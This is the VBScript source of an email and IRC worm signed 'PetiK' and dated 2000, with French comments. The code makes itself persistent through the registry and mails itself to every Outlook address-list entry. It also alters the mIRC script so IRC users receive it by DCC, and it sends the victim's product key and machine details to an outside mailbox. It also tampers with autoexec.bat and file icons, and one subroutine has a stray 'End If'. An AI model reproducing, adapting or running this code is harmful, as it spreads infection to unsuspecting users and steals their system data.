'VBS/mIRC/Outlook.ShortCut.A par PetiK                 10/12/2000

Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopie = file.ReadAll

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)
ShortCut = (win&"\SAMPLES\WSH\Shortcut.vbs")
Set inf  = fso.OpenTextFile (ShortCut,2,true)
inf.Write  vbscopie
inf.Close
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\ShortCut",ShortCut
id=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
If (id<>PetiK) Then
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "PetiK"
End If
EMAIL()		'ENVOIE LE PROGRAMME PAR OUTLOOK
MIRC()		'ENVOIE LE PROGRAMME PAR mIRC
AUTOEXEC()	'MODIFIE AUTOEXEC.BAT LE 1ER, LE 15 ET LE 30
ICONE()		'MODIFIE LES ICONES DES .EXE .HTM ET .HTA AVEC CELUI DES .VBS
End Sub


Sub EMAIL()
id2=ws.RegRead("HKLM\Software\")
If id2 <> "OK" Then
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "ShortCut for WINDOWS"
msg.Body = "This is a good ShortCut for your computer"
msg.Attachments.Add fso.BuildPath(fso.GetspecialFolder(0),"\SAMPLES\WSH\Shortcut.vbs")
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End if
Set msg2 = OApp.CreateItem(0)
msg2.BCC = "Panda34@caramail.com"
nom = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
CN = CreateObject("WScript.NetWork").ComputerName
msg2.Subject = "Message de """ & nom & """ alias " & CN & ""
page = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
PK = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\ProductKey")
msg2.Body = "-IE :  """ & page & """ -Produkt Key """ & PK & """"
msg2.Send
ws.RegWrite "HKLM\Software\","OK"
End If
End Sub

Sub MIRC()
On Error Resume Next
If fso.FileExists("C:\mirc\script.ini") Then
 Set c    = fso.GetFile(WScript.ScriptFullName)
 c.Copy("C:\mirc\ShortCut.txt.vbs")
 Set srpt = fso.CreateTextFile("C:\mirc\script.ini",true)
 srpt.WriteLine  "[script]; "&win&"\Winmine.exe"
 srpt.WriteLine  "n0=on 1:JOIN:#:{"
 srpt.WriteLine  "n1= /if ( $nick == $me ) { halt }"
 srpt.WriteLine  "n2= /.dcc send $nick C:\mirc\ShortCut.txt.vbs"
 srpt.WriteLine  "n3=}"
 srpt.Close
End If
End Sub

Sub AUTOEXEC()
If Day(Now()) = 1 or Day(Now()) = 15 or Day(Now()) = 30 then
 file = "c:\autoexec.bat"
 Set autoexec = fso.OpenTextFile (file, 1, False, False)
 TLine = autoexec.Readall
 Set autobat= fso.CreateTextFile (file, True, False)
  autobat.write(tline)
  autobat.WriteBlankLines(1)
  autobat.WriteLine "@echo off"
  autobat.WriteLine "cls"
  autobat.WriteLine "echo."
  autobat.WriteLine "echo."
  autobat.WriteLine "echo VBS/mIRC/Outloock.ShortCut.A par PetiK"
  autobat.WriteLine "echo (c)2000"
  autobat.WriteLine "echo."
  autobat.WriteLine "echo JOYEUX NOEL ET BONNE ANNEE"
  autobat.WriteLine "pause"
 End If
End Sub

Sub ICONE()
AZE = ws.RegRead ("HKCR\VBSfile\DefaultIcon\")
ws.RegWrite "HKCR\exefile\DefaultIcon\",AZE
ws.RegWrite "HKCR\htmfile\DefaultIcon\",AZE
ws.RegWrite "HKCR\htafile\DefaultIcon\",AZE
End If
End Sub
